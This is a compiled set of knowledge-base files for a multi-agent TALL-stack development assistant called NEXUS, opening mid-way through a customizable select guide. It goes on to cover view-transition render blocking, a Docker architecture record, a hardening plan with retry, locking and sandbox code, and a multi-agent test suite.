  <button>
    <selectedcontent></selectedcontent>
  </button>
  <option value="standard">Standard Shipping</option>
  <option value="express" selected>Express Shipping</option>
  <option value="overnight">Overnight Delivery</option>
</select>
```

## Strategic Implementation & Best Practices

- **DO** use `appearance: base-select` when your design system requires high-fidelity, visual consistency across all form controls that cannot be achieved with standard cross-browser select overrides.
- **DO NOT** use this if you rely on the operating system's native picker experience (e.g., the standard scroll wheel picker on iOS devices). Opting into `base-select` opts out of native mobile UI controls in favor of web-rendered top-layer menus.
- **DO** verify that color contrast meets WCAG standards. The customizable picker allows you to set ad-hoc colors, but you are responsible for ensuring text remains legible against custom backgrounds.
- **DO** test layout behavior. Setting `appearance: base-select` removes the default browser behavior of sizing the select based on its longest option width. You may need to set a fixed width or use flex/grid constraints to prevent layout shifts.
- **DO** ensure your `<select>` has a `name` attribute and an associated `<label>`. This ensures that even with a custom UI, the component remains accessible to screen readers and works correctly with standard form submissions.

## Fallback strategies

### Fallbacks & browser support for Customizable <select>

Customizable <select> has limited availability.
Supported by: Chrome 135 (Apr 2025) and Edge 135 (Apr 2025).
Unsupported in: Firefox and Safari.

For browsers that do not yet support `appearance: base-select`, the `<select>` element degrades gracefully to a standard operating system dropdown.

- **Non-Text Content Ignored**: Older browsers strip HTML tags (like `<svg>` or `<div>`) inside `<option>` tags and render only the text nodes. Ensure the text content of the `<option>` is readable and meaningful on its own.
- **HTML Structure Handling**: Standard parsers may ignore the `<button>` and `<selectedcontent>` tags inside `<select>` or treat them as invalid. No heavy JavaScript polyfills are strictly required for progressive enhancement if you view standard text as a readable fallback.


```javascript
document.addEventListener("DOMContentLoaded", () => {
  // Check if browser supports base-select value
  if (!CSS.supports("appearance", "base-select")) {
    // Custom select overrides are not supported natively.
  }
});
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, vcs, api]

### 📘 KNOWLEDGE: NEXUS_CONSISTENT-CROSS-DOCUMENT-TRANSITIONS.MD

# Consistent Cross-Document Transitions
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## The Problem

Cross-document view transitions animate elements between two pages during a same-origin navigation. The browser captures a snapshot of the old page, navigates, then animates from the snapshot to the new page. If the new page has not finished loading critical resources — stylesheets, layout scripts, or key DOM elements — the transition animates to an incomplete or unstyled state. This causes visual glitches such as elements morphing to wrong positions, content reflowing mid-animation, or fallback fonts flashing to web fonts after the transition completes.

## The Solution

Use `blocking="render"` on critical `<link>` and `<script>` elements in the new page's `<head>`, and use `<link rel="expect">` to block rendering until specific DOM elements have been parsed. This ensures the browser does not begin the view transition animation until the new page's visual state is stable. The browser continues parsing the HTML in the background — only painting is deferred.

### Implementation Strategy

1. **MANDATORY:** Opt in to cross-document view transitions with the `@view-transition` CSS at-rule on both pages.
2. **MANDATORY:** Ensure critical stylesheets are in the `<head>`. Stylesheets in the `<head>` are render-blocking by default. Dynamically injected stylesheets require explicit `blocking="render"`.
3. **DO** use `blocking="render"` on `<script>` elements that must execute before the transition animates (e.g., scripts that apply a theme or affect the layout).
4. **DO** use `<link rel="expect" href="#element-id" blocking="render">` to block rendering until above-the-fold content has been parsed. This applies to all transition types: full-page cross-fades (to avoid animating to a blank page), morph animations (to ensure named elements exist in the DOM), and script-dependent layouts (to ensure styled content is parsed).
5. **DO NOT** block rendering on non-critical content. Only block on resources and elements that affect the initial viewport. Blocking on too much content delays the transition and degrades perceived performance.

## Implementation Guide

### Step 1: Opt in to Cross-Document View Transitions

MANDATORY: Both the source and destination pages must include the `@view-transition` at-rule. Without this, no cross-document transition occurs.

```css
/*
  MANDATORY: Include this rule in every page that participates
  in cross-document view transitions.
  `navigation: auto` enables transitions for standard navigations
  (link clicks, form submissions, back/forward).
*/
@view-transition {
  navigation: auto;
}

/* MANDATORY Copy-Paste Safety: Disable cross-document view transitions for users requesting reduced motion */
@media (prefers-reduced-motion: reduce) {
  @view-transition {
    navigation: none;
  }
}
```

### Step 2: Block Rendering Until Critical Scripts Execute

If a non-blocking script in the `<head>` must run before the transition animates (e.g., to apply a theme class or affect the layout), mark it with `blocking="render"`. Without this, `async`, `defer`, or `type="module"` scripts may execute after the transition has already started.

```html
<head>
  <!--
    DO: Mark layout-critical scripts with blocking="render".
  -->
  <script type=module blocking="render">
    // Example: apply a stored theme before the page renders,
    // so the transition snapshot reflects the correct theme.
    document.documentElement.dataset.theme =
      localStorage.getItem('theme') || 'light';
  </script>
</head>
```

### Step 3: Block Rendering Until Key DOM Elements Are Parsed

Stylesheets and `blocking="render"` scripts in the `<head>` only guarantee that the `<head>` has been fully processed. They do **not** wait for any `<body>` content to be parsed. Without additional blocking, the browser may take the new-page snapshot before above-the-fold elements exist in the DOM — resulting in a transition that animates to a blank or partially rendered page.

`<link rel="expect">` solves this by blocking rendering until a specific element (identified by its `id`) has been parsed. The `href` value must be a fragment identifier (e.g., `#hero`) matching the target element's `id` attribute. Once that element's closing tag is parsed, the render block is released.

**DO** use `<link rel="expect">` in all of the following scenarios:

#### Use Case 1: Full-Page Cross-Fade

Even when no individual elements have a `view-transition-name`, the default `root` transition cross-fades the entire page. If the new page's snapshot is taken before above-the-fold content is parsed, the cross-fade animates from the old page to a blank or incomplete page. Block rendering on an element that marks the end of the visible above-the-fold content.

```html
<head>
  <link rel="stylesheet" href="/css/styles.css">

  <!--
    DO: Block rendering until the main content area is parsed,
    even for a simple cross-fade. Without this, the browser may
    snapshot the page before visible content exists in the DOM,
    causing the cross-fade to reveal a blank or partial page.
  -->
  <link rel="expect" href="#main-content" blocking="render">
</head>
<body>
  <header>...</header>
  <main id="main-content">
    <h1>Page Title</h1>
    <p>Above-the-fold content the user should see immediately.</p>
  </main>
  <!-- Content below the fold does NOT need to be blocked on -->
  <section>...</section>
</body>
```

#### Use Case 2: Morph Animations Between Specific Elements

When elements on both pages share a `view-transition-name`, the browser morphs them smoothly across the navigation. If the target element has not been parsed when the transition starts, the browser cannot find it — the morph degrades to separate exit and entry animations. Block rendering until the element with the `view-transition-name` has been parsed.

```html
<head>
  <link rel="stylesheet" href="/css/styles.css">

  <!--
    DO: Block rendering until the element participating in the
    morph animation has been parsed. Without this, the browser
    may start the transition before #hero exists, causing the
    morph to degrade to a fade-out/fade-in.
  -->
  <link rel="expect" href="#hero" blocking="render">

  <!--
    When multiple blocking="render" resources are present,
    rendering is blocked until ALL of them are satisfied.
    Here, the browser waits for both the script to execute
    AND the #hero element to be parsed — whichever comes last.
  -->
  <script async blocking="render" src="/js/transition-setup.js"></script>
</head>
<body>
  <header>...</header>
  <section id="hero">
    <h1 style="view-transition-name: page-title">Product Name</h1>
    <img style="view-transition-name: hero-image" src="/img/product.webp" alt="Product">
  </section>
</body>
```

### Step 4: Use Media Queries for Responsive Render Blocking

Different viewport sizes may show different amounts of content above the fold. Use the `media` attribute on `<link rel="expect">` to block rendering only for the content visible at a given viewport width.

```html
<head>
  <!--
    DO: Use media queries to conditionally block rendering.
    On wide screens, both the hero and the sidebar are visible,
    so block until both are parsed. On narrow screens, only the
    hero is visible initially.
  -->
  <link
    rel="expect"
    href="#hero"
    blocking="render"
    media="screen and (width <= 768px)"
  >
  <link
    rel="expect"
    href="#sidebar"
    blocking="render"
    media="screen and (width > 768px)"
  >
</head>
```

### Step 5: Use pagereveal for Context-Dependent Transitions (Optional)

The `pagereveal` event is **not required** for the core render-blocking strategy. It is only needed when `view-transition-name` values must be assigned dynamically based on where the user navigated from — for example, morphing a specific list item to a detail page heading.

If `view-transition-name` values are assigned statically in CSS, or if you are only using the default full-page cross-fade, skip this step entirely.

```html
<head>
  <!--
    MANDATORY: The pagereveal listener must be registered before
    the page renders. Use an async script with blocking="render"
    so the listener is registered early without blocking parsing.
    If the listener is registered too late (e.g., in a deferred
    script), the event may have already fired.
  -->
  <script async blocking="render" src="/js/transition-setup.js"></script>
</head>
```

```javascript
// transition-setup.js
window.addEventListener('pagereveal', async (event) => {
  if (!event.viewTransition) return;

  const from = navigation.activation?.from;
  if (!from) return;

  const fromUrl = new URL(from.url);

  // DO: Assign view-transition-name based on navigation context.
  // This enables a morph animation from the product card on the
  // list page to the heading on the detail page.
  if (fromUrl.pathname === '/products/') {
    const heading = document.querySelector('main h1');
    if (heading) {
      heading.style.viewTransitionName = 'product-title';
    }

    // MANDATORY: Remove the temporary name after the transition
    // finishes. Stale names interfere with subsequent navigations
    // and prevent the page from entering the bfcache.
    await event.viewTransition.finished;
    heading.style.viewTransitionName = '';
  }
});
```

## Best Practices

- **DO** assign `view-transition-name` via CSS whenever possible. Reserve JavaScript assignment (via `pagereveal`) for cases where the name depends on navigation context.
- **DO** keep render-blocking scripts small and fast. The browser has a built-in timeout (around 4 seconds), after which the transition is skipped entirely with a `TimeoutError`.
- **DO NOT** use `<link rel="expect">` to block on elements deep in the page that are not visible in the initial viewport. This delays the transition without visual benefit.
- **DO NOT** assign the same `view-transition-name` to multiple elements on the same page. Duplicate names cause the entire transition to be skipped.
- **Assistive Technology Timing Impact**: Using `blocking="render"` delays visual updates and initial paint. While this prevents visual glitches for sighted users, it can cause processing latency or deferred initialization for screen readers and other assistive technologies that depend on rendered accessibility trees. Weigh the visual continuity benefits against the initial read latency for non-visual users, and ensure render-blocking scripts are minimal and extremely optimized.

## Fallback Strategies

Cross-document view transitions has limited availability.
Supported by: Chrome 126 (Jun 2024), Edge 126 (Jun 2024), and Safari 18.2 (Dec 2024).
Unsupported in: Firefox.

Cross-document view transitions are an excellent candidate for progressive enhancement. In browsers that do not support them, the `@view-transition` rule is ignored and standard same-origin navigations occurs exactly as they would without the feature. Supporting browsers get smooth transitions; all others get standard navigation. Limited browser support is not a reason to avoid adoption.

All browsers that support cross-document view transitions also support `blocking="render"` and `<link rel="expect">`, so no separate fallback is needed for the render-blocking features described in this guide.

## Other Considerations

1. **Performance Impact**: Every render-blocking resource delays the view transition animation start. Minimize the number of render-blocking scripts and use `<link rel="expect">` only for elements that are above the fold. Prerender destination pages using the Speculation Rules API to eliminate loading delays entirely.
2. **Timeout Behavior**: If the combined render-blocking time exceeds approximately 4 seconds, the browser skips the transition with a `TimeoutError`. Ensure critical resources load well within this window.
3. **bfcache Compatibility**: Temporary `view-transition-name` assignments that are not cleaned up after the transition can prevent the page from entering the bfcache. Always remove dynamically assigned names in the `finished` callback.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_DOCKER_TALL_EVOLUTION.MD

# 📜 Nexus Evolution Record: Docker & TALL Stack Strategy
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> **Date**: 08/05/2026
> **Session Status**: Evolutionary Sync
> **Context**: Optimization of Nexus Engine for multi-project TALL Stack orchestration.

---

## 0. 🎯 Visi & Rencana Awal (Original Vision)
Nexus AI dikembangkan dengan tujuan utama yang jelas dari USER:
- **Fokus Utama**: Membangun sistem *multi-agent* yang terspesialisasi dalam pengembangan **TALL Stack** (Tailwind CSS, Alpine.js, Laravel, Livewire).
- **Skala Pengelolaan**: Mengorkestrasi dan membantu pengelolaan **3-5 proyek aktif** berbasis TALL stack secara efisien.
- **Filosofi**: Nexus bertindak sebagai **"Asisten Otonom"** yang mendukung USER, bukan menggantikannya, dengan memastikan kualitas kode dan arsitektur tetap terjaga di seluruh proyek.

---

## 1. 🐳 Docker Architecture Evolution
Sistem Nexus AI kini telah dipindahkan ke dalam Docker untuk meningkatkan otonomi dan portabilitas.

- **Status Docker**: Aktif (Docker Desktop WSL2).
- **Konfigurasi**:
    - **Dockerfile**: Menggunakan `node:18-slim` dengan dependensi sistem `git` dan `curl` untuk mendukung `WorktreeManager`.
    - **Docker Compose**: Menggunakan model "Central Hub" di mana proyek eksternal di-mount ke `/app/workspace`.
- **Manfaat**: Isolasi eksekusi (Sandboxing) dan konsistensi audit lintas proyek.

## 2. 🎯 TALL Stack Specialization
Strategi pengembangan difokuskan pada **TALL Stack (Tailwind CSS, Alpine.js, Laravel, Livewire)** untuk mengelola 3-5 proyek aktif milik USER.

- **Fokus Audit**: Integrasi antara Blade logic, Livewire hydration, dan Alpine.js reactive state.
- **Role Nexus**: Sebagai asisten/orchestrator yang menjaga standar kualitas dan konsistensi di seluruh ekosistem TALL Stack.

## 3. 🤖 Agent Hierarchy (The Team Structure)
Telah ditetapkan hirarki 4 level dalam ekosistem Nexus AI:

| Level | Role | Komponen | Deskripsi |
| :--- | :--- | :--- | :--- |
| **0** | **The Creator** | User (Human) | Pengambil keputusan tertinggi & Approval. |
| **1** | **Orchestrator** | Nexus Engine | Project Manager yang mengatur alur Audit -> Plan. |
| **2** | **Specialists** | Agent MDs | Konsultan Ahli (e.g. TALL Specialist, Security). |
| **3** | **Machines** | JS Tools | Eksekutor teknis (e.g. LaravelArchitect, BugHunter). |

## 4. 🚀 Next Steps (Roadmap)
- [ ] Implementasi **TALL Stack Specialist Agent** (Level 2).
- [ ] Penambahan library prompt khusus Livewire & Alpine.js ke dalam Memory HUB.
- [ ] Pengujian audit lintas-proyek menggunakan Docker Volume mounting.

---
*Generated by Nexus Assistant | Approved for Institutional Knowledge*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, vcs]

### 📘 KNOWLEDGE: NEXUS_HARDENING_PLAN.MD

# NEXUS — Post-Stabilization Hardening Plan
> **VERSION**: v1 | **Last Updated**: 26/05/2026


## Dari Stable → Robust → Autonomous-Ready

> **Source of Truth**: Dibuat dari 4x loop scanning terhadap kondisi aktual kode  
> **Target**: Deterministic, Observable, Resilient System  
> **Prinsip**: Stability > Intelligence. Jika tidak bisa di-debug, tidak bisa di-scale.

---

## 📊 Gap Analysis (Kondisi Aktual vs Target)

| Komponen | Ada? | Gap Kritis |
|---|---|---|
| `TaskProtocol.js` | ✅ | Tidak ada `trace_id` / `correlation_id` |
| `Logger.js` | ✅ | Log tidak terhubung antar siklus, tidak ada `trace_id` |
| `MemoryGovernor.js` | ✅ | Tidak ada locking, tidak ada rollback mechanism |
| `EventBus.js` | ✅ | Tidak ada event audit log, tidak ada duplicate detection |
| `Orchestrator.js` | ✅ | Tidak ada retry logic, tidak ada fallback, tidak ada error type |
| `SandboxExecutor.js` | ✅ | Tidak dipakai di `audit()` — scanner masih dipanggil langsung |
| `Contract.js` | ✅ | Tidak ada structured error schema |
| `NexusEngine.audit()` | ✅ | Scanner bypass EventBus — direct `require()` + `scanner.scan()` |
| `NexusEngine.execute()` | ✅ | Error hanya `continue`, tidak ada retry/fallback/error classification |
| Performance Profiling | ⚠️ | Ada di level siklus, belum ada di per-agent |
| Stress/Chaos Testing | ❌ | Tidak ada sama sekali |

---

## 🗺️ Fase Hardening (Berurutan)

---

### 🔴 PHASE H1: Observability Foundation
**Priority**: CRITICAL — Harus dikerjakan pertama  
**Target dokumen hardening**: §3.5

#### H1.1 — Tambah `trace_id` dan `correlation_id`

**File**: `agent/core/TaskProtocol.js`  
Tambahkan field:
```js
this.trace_id = `TRACE-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
this.correlation_id = options.correlation_id || this.trace_id; // link ke siklus parent
```

**File**: `agent/core/Logger.js`  
Update signature `log()` untuk menerima `trace_id`:
```js
async log(category, level, agent, task_id, event, message, duration_ms = 0, metadata = {}, trace_id = 'N/A')
```
Dan masukkan `trace_id` ke dalam `logEntry`.

#### H1.2 — Cycle-Level Correlation

**File**: `agent/core/NexusEngine.js`  
Di awal `runCycle()`, generate satu `cycleCorrelationId`:
```js
const cycleCorrelationId = `CORR-${Date.now()}`;
```
Teruskan ID ini ke setiap pemanggilan `this.logger.log()` sebagai `trace_id`.

**Definition of Done H1**:  
- [ ] Setiap log entry memiliki `trace_id`  
- [ ] Seluruh log dalam satu siklus audit→plan→execute memiliki `correlation_id` yang sama  

---

### 🔴 PHASE H2: Failure Handling (Retry + Structured Error)
**Priority**: CRITICAL  
**Target dokumen hardening**: §3.4

#### H2.1 — Structured Error Schema di `Contract.js`

Tambahkan class `NexusErrorPayload`:
```js
class NexusErrorPayload {
    constructor(type, message, retryable = false, agent = 'unknown') {
        this.status = 'error';
        this.type = type; // e.g. 'MEMORY_CONFLICT', 'SCANNER_TIMEOUT'
        this.message = message;
        this.retryable = retryable;
        this.agent = agent;
        this.timestamp = new Date().toISOString();
    }
}
```

#### H2.2 — Retry Logic di `Orchestrator.js`

Ganti blok `catch` dengan mekanisme retry:
```js
const MAX_RETRY = 3;
let attempt = 0;
while (attempt < MAX_RETRY) {
    try {
        const result = await this.sandbox.execute(...);
        // success path
        break;
    } catch (err) {
        attempt++;
        const errPayload = new NexusErrorPayload('AGENT_FAILURE', err.message, attempt < MAX_RETRY, payload.agent);
        await this.logger.log('errors', 'WARNING', 'Orchestrator', task.task_id, 'RETRY', `Retry ${attempt}/${MAX_RETRY}`);
        if (attempt >= MAX_RETRY) {
            task.status = 'failed';
            EventBus.publish('TASK_FAILED', { task_id: task.task_id, error: errPayload });
        }
    }
}
```

**Definition of Done H2**:  
- [ ] Setiap kegagalan punya `type`, `retryable`, `agent`  
- [ ] Orchestrator mencoba ulang max 3x sebelum menyerah  
- [ ] Event `TASK_FAILED` dipublish agar komponen lain bisa bereaksi  

---

### 🔴 PHASE H3: Memory Integrity (Lock + Rollback)
**Priority**: CRITICAL  
**Target dokumen hardening**: §3.3

#### H3.1 — File-Based Soft Locking di `MemoryGovernor.js`

Tambahkan metode `acquireLock()` dan `releaseLock()`:
```js
async acquireLock(filename, timeoutMs = 5000) {
    const lockFile = path.join(this.memoryPath, `${filename}.lock`);
    const start = Date.now();
    while (await fs.pathExists(lockFile)) {
        if (Date.now() - start > timeoutMs) {
            throw new Error(`MemoryGovernor: Lock timeout on ${filename}`);
        }
        await new Promise(r => setTimeout(r, 100)); // poll every 100ms
    }
    await fs.writeJson(lockFile, { locked_at: new Date().toISOString() });
}

async releaseLock(filename) {
    const lockFile = path.join(this.memoryPath, `${filename}.lock`);
    await fs.remove(lockFile);
}
```

Update `validateAndStore()` untuk menggunakan lock:
```js
await this.acquireLock(filename);
try {
    // ... existing write logic ...
} finally {
    await this.releaseLock(filename);
}
```

#### H3.2 — Rollback Mechanism

Sebelum menulis file baru, simpan versi sebelumnya ke `memory/archived/`:
```js
if (await fs.pathExists(outputPath)) {
    const backupPath = path.join(this.memoryPath, 'archived', `${filename}.v${version - 1}.bak.json`);
    await fs.copy(outputPath, backupPath);
}
```

**Definition of Done H3**:  
- [ ] Tidak ada dua agent bisa menulis file memori yang sama secara bersamaan  
- [ ] Setiap penulisan memori baru memiliki backup versi sebelumnya di `memory/archived/`  

---

### 🟡 PHASE H4: Plugin Safety via SandboxExecutor
**Priority**: HIGH  
**Target dokumen hardening**: §3.8

#### H4.1 — Gunakan SandboxExecutor di `NexusEngine.audit()`

Saat ini scanner dipanggil langsung. Ini harus diganti:

**Sebelum (bermasalah):**
```js
const scanner = require(scannerPath);
if (scanner.scan) {
    specFindings = await scanner.scan(targetPath);
}
```

**Sesudah (via Sandbox):**
```js
// Di constructor, instansiasi sandbox
this.sandbox = new SandboxExecutor();

// Di audit()
specFindings = await this.sandbox.execute(scannerPath, { targetPath }, { timeout: 15000 });
```

#### H4.2 — Permission Validation di `SandboxExecutor.js`

Tambahkan pengecekan terhadap `manifest.json`:
```js
const manifest = require('../../tools/scanners/manifest.json');
const pluginMeta = manifest.scanners.find(s => scannerPath.includes(s.entrypoint));
if (!pluginMeta) throw new Error(`Plugin ${scannerPath} not registered in manifest.`);
```

**Definition of Done H4**:  
- [ ] Semua scanner dieksekusi via `SandboxExecutor` dengan timeout  
- [ ] Plugin yang tidak terdaftar di `manifest.json` ditolak  

---

### 🟡 PHASE H5: EventBus Validation
**Priority**: HIGH  
**Target dokumen hardening**: §3.7

#### H5.1 — Event Audit Log di `EventBus.js`

Update `publish()` untuk mencatat setiap event:
```js
publish(event, payload) {
    const entry = { event, timestamp: new Date().toISOString(), payload_keys: Object.keys(payload || {}) };
    this._auditLog = this._auditLog || [];
    this._auditLog.push(entry);
    this.emit(event, payload);
}

getAuditLog() { return this._auditLog || []; }
clearAuditLog() { this._auditLog = []; }
```

#### H5.2 — Duplicate Event Detection

```js
publish(event, payload) {
    const eventKey = `${event}-${JSON.stringify(payload).slice(0, 50)}`;
    if (this._recentEvents && this._recentEvents.has(eventKey)) return; // skip duplicate
    this._recentEvents = this._recentEvents || new Set();
    this._recentEvents.add(eventKey);
    setTimeout(() => this._recentEvents.delete(eventKey), 1000); // clear after 1s
    this.emit(event, payload);
}
```

**Definition of Done H5**:  
- [ ] Setiap event tercatat di audit log  
- [ ] Event duplikat dalam window 1 detik diabaikan  

---

### 🟢 PHASE H6: Performance Profiling Per-Agent
**Priority**: MEDIUM  
**Target dokumen hardening**: §3.6

**File**: `agent/core/NexusEngine.js` — di dalam loop scanner `auditPromises.map()`

```js
const agentStart = Date.now();
specFindings = await this.sandbox.execute(...);
const agentDuration = Date.now() - agentStart;
this.metrics[spec.id] = { duration_ms: agentDuration, findings: specFindings.length };
await this.logger.log('agents', 'INFO', spec.id, auditID, 'AGENT_PROFILED', `Completed in ${agentDuration}ms`, agentDuration);
```

**Definition of Done H6**:  
- [ ] Setiap agent memiliki `duration_ms` di `this.metrics`  
- [ ] Metrics ditulis ke log dan ke `cycle_summary`  

---

### 🟢 PHASE H7: Stress Testing
**Priority**: MEDIUM (setelah H1-H5 selesai)  
**Target dokumen hardening**: §3.9

Buat file `agent/tests/stress-test.js`:
- Kirim 10 task simultan ke `Orchestrator.routeTask()`
- Validasi bahwa tidak ada race condition di memory
- Validasi bahwa semua task dicatat di log
- Validasi bahwa sistem tidak crash saat satu agent timeout

---

## 🏁 Definition of "TRULY ROBUST" (Checklist Akhir)

Sistem dinyatakan **Robust** jika seluruh item ini ✅:

- [ ] **H1**: Setiap log punya `trace_id`. Satu siklus punya satu `correlation_id`.
- [ ] **H2**: Setiap error punya `type` + `retryable`. Orchestrator retry 3x.
- [ ] **H3**: Memory write terlindungi lock. Rollback tersedia di `memory/archived/`.
- [ ] **H4**: Semua scanner dieksekusi via `SandboxExecutor`. Plugin tidak terdaftar ditolak.
- [ ] **H5**: Semua event di EventBus tercatat. Duplikat diabaikan.
- [ ] **H6**: Setiap agent punya profil `duration_ms` di tiap siklus.
- [ ] **H7**: Stress test 10 task paralel berjalan tanpa crash.

---

## 🗺️ Urutan Eksekusi Rekomendasikan

```
H1 (trace_id) → H2 (retry) → H3 (locking) → H4 (sandbox) → H5 (eventbus) → H6 (profiling) → H7 (stress test)
```

> **Alasan urutan**: Tanpa `trace_id` (H1), kita buta saat debug H2-H7.  
> Tanpa retry (H2), crash di H3-H7 tidak bisa pulih.  
> Tanpa locking (H3), stress test (H7) akan menghasilkan false positives.

---

*Generated by: NEXUS Loop Scanning (4 Iterations) | 2026-05-07*  
*Status: FINAL OUTPUT — Siap untuk Eksekusi*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, vcs]

### 📘 KNOWLEDGE: NEXUS_NEXUS MULTI AGENT  TEST.MD

# NEXUS — Multi-Agent Test Suite (TALL Stack)
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Goal: Validate True Agent Behavior (Not Prompt Replay)

---

# 1. Test Philosophy

## Anti-Pattern (yang ingin dihindari)

```text
Input → Output → selesai
```

## Target NEXUS

```text
Observe → Reason → Decide → Act → Verify → Iterate
```

---

# 2. Test Categories Overview

| Category    | Purpose                                |
| ----------- | -------------------------------------- |
| Functional  | memastikan fitur bekerja               |
| Behavioral  | memastikan agent tidak sekadar replay  |
| Adaptive    | memastikan agent bisa berubah strategi |
| Failure     | memastikan sistem tahan error          |
| Memory      | memastikan sistem belajar & konsisten  |
| Multi-Agent | memastikan koordinasi antar agent      |

---

# 3. Functional Tests (TALL Stack)

---

## 3.1 Laravel Backend

### Test: API Integrity

- Agent membaca route Laravel
- generate request
- validasi response

### Expected

```text
status code valid
response schema sesuai
no crash
```

---

## 3.2 Livewire Components

### Test: Reactive State

- trigger state change
- observe DOM update

### Expected

```text
state berubah
UI update tanpa reload
```

---

## 3.3 Alpine.js Interaction

### Test: Frontend Behavior

- simulate click
- toggle state
- evaluate DOM

---

## 3.4 Tailwind UI Consistency

### Test: UI Validation

- scan class usage
- detect broken layout
- check responsiveness (basic)

---

# 4. Behavioral Tests (CRITICAL)

---

## 4.1 Non-Repetition Test

### Scenario

- jalankan task sama 3x
- ubah kondisi sedikit

### Expected

```text
agent tidak copy output sebelumnya
agent adapt terhadap perubahan
```

---

## 4.2 Decision Variation Test

### Scenario

- berikan 2 solusi valid

### Expected

```text
agent bisa memilih strategi berbeda
bukan selalu pattern sama
```

---

# 5. Adaptive Tests

---

## 5.1 Strategy Shift Test

### Scenario

- solusi awal gagal
- agent harus retry

### Expected

```text
agent mencoba pendekatan baru
bukan mengulang solusi sama
```

---

## 5.2 Context Change Test

### Scenario

- ubah config environment

### Expected

```text
agent menyesuaikan behavior
```

---

# 6. Failure Handling Tests

---

## 6.1 Broken Route Test

- inject invalid route

### Expected

```text
agent detect error
agent classify error
agent trigger fallback
```

---

## 6.2 Livewire Crash Test

- simulate component failure

### Expected

```text
agent isolate issue
tidak crash seluruh system
```

---

## 6.3 API Timeout Test

### Expected

```text
retry logic jalan
timeout handled
```

---

# 7. Memory Tests

---

## 7.1 Knowledge Consistency

### Scenario

- simpan hasil analisis
- gunakan ulang

### Expected

```text
tidak terjadi konflik data
```

---

## 7.2 Learning Retention

### Scenario

- agent gagal → belajar → ulang

### Expected

```text
hasil kedua lebih baik
```

---

# 8. Multi-Agent Coordination Tests

---

## 8.1 Pipeline Execution

### Scenario

```text
Crawler → Memory → Analyzer → Fixer
```

### Expected

```text
data flow benar
tidak lompat step
```

---

## 8.2 Parallel Execution

### Scenario

- jalankan 3 agent bersamaan

### Expected

```text
tidak terjadi race condition
tidak corrupt memory
```

---

## 8.3 Conflict Resolution

### Scenario

- 2 agent modify resource sama

### Expected

```text
conflict detection jalan
resolution strategy dipilih
```

---

# 9. Autonomy Tests

---

## 9.1 Self-Trigger Test

### Scenario

- system detect anomaly

### Expected

```text
agent jalan tanpa human trigger
```

---

## 9.2 Goal Execution Test

### Scenario

- goal: "optimize performance"

### Expected

```text
agent breakdown task
execute step-by-step
```

---

# 10. TALL Stack Specific Deep Tests

---

## 10.1 Livewire + Backend Sync

### Scenario

- form submit → DB update → UI reflect

### Expected

```text
no desync
```

---

## 10.2 Alpine + Livewire Interaction

### Scenario

- Alpine state → Livewire action

### Expected

```text
event sync benar
```

---

## 10.3 Tailwind Responsiveness

### Scenario

- simulate mobile viewport

### Expected

```text
layout tidak rusak
```

---

# 11. Metrics (WAJIB)

```text
task_success_rate
retry_count
adaptation_rate
error_recovery_rate
decision_variance
memory_conflict_rate
```

---

# 12. Advanced Test (Very Important)

---

## 12.1 Anti-Prompt-Replay Test

### Scenario

- jalankan task tanpa prompt sama

### Expected

```text
agent tetap bisa solve
berdasarkan reasoning
```

---

## 12.2 Emergent Behavior Test

### Scenario

- task kompleks (multi-step)

### Expected

```text
agent membuat sub-task sendiri
```

---

# 13. Final Validation

System dianggap berhasil jika:

```text
agent tidak tergantung prompt
agent bisa adapt
agent bisa recover
agent bisa koordinasi
agent bisa decide
```

---

# 14. Final Principle

```text
If the system only repeats,
it is not an agent.

If the system can decide,
it becomes a system.
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_NEXUS POST STABILIZATION HARDERING.MD

# NEXUS — Post-Stabilization Hardening Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Phase: From Stable → Robust → Autonomous-Ready

> Status:
> Multi-Agent System: **STABLE (Functional)**
>
> Next Target:
> **Deterministic, Observable, and Resilient System**

---

# 1. Reality Check (Critical)

Stabil ≠ Aman

Walaupun sistem sudah:

- tidak crash
- agent berjalan konsisten
- workflow berhasil

Masih mungkin ada:

```text
hidden race conditions
silent memory corruption
non-deterministic outputs
edge-case failures
```

---

# 2. New Phase Objective

```text
Make NEXUS predictable under stress
```

---

# 3. Hardening Priorities

---

# 3.1 Deterministic Execution

## Problem

Agent masih kemungkinan:

- menghasilkan output berbeda untuk input sama
- tergantung timing / order

---

## Target

```text
Same input → Same output → Same state
```

---

## Implementation

- enforce strict input schema
- remove implicit dependencies
- freeze execution order (if needed)
- add state snapshots

---

# 3.2 Concurrency Safety

## Problem

Multi-agent system = concurrency risk

---

## Risks

```text
race condition
double write
lost update
inconsistent memory state
```

---

## Solution

### Introduce:

- locking mechanism (soft/hard)
- transaction-based memory write
- queue-based execution (FIFO / priority)

---

## Example

```text
memory.write()
→ lock
→ validate
→ write
→ release
```

---

# 3.3 Memory Integrity System

## Target

Memory harus:

```text
consistent
traceable
recoverable
```

---

## Add

- checksum per entry
- version history
- diff tracking
- rollback mechanism

---

## Rule

```text
NO direct overwrite without versioning
```

---

# 3.4 Failure Handling System

## Problem

Sebagian besar system terlihat stabil sampai error muncul.

---

## Target

```text
Fail gracefully, not silently
```

---

## Required

Every agent must:

- return structured error
- classify error type
- support retry
- support fallback

---

## Error Example

```json
{
  "status": "error",
  "type": "MEMORY_CONFLICT",
  "retryable": true,
  "message": ""
}
```

---

# 3.5 Observability Layer

## Target

```text
You must SEE the system thinking
```

---

## Required Logs

- task lifecycle
- agent execution
- memory mutation
- plugin usage
- error traces

---

## Add

- trace_id per task
- correlation_id across agents

---

# 3.6 Performance Profiling

## Problem

Stable ≠ Efficient

---

## Add Measurement

- execution time per agent
- memory usage
- queue latency
- bottleneck detection

---

## Output Example

```text
Agent: memory_pipeline
Time: 120ms
Status: OK
```

---

# 3.7 Event Bus Validation

## Check

- no lost events
- no duplicate events
- correct event ordering

---

## Add

- event audit log
- replay capability

---

# 3.8 Plugin Safety Reinforcement

## Must Ensure

- plugin cannot crash core
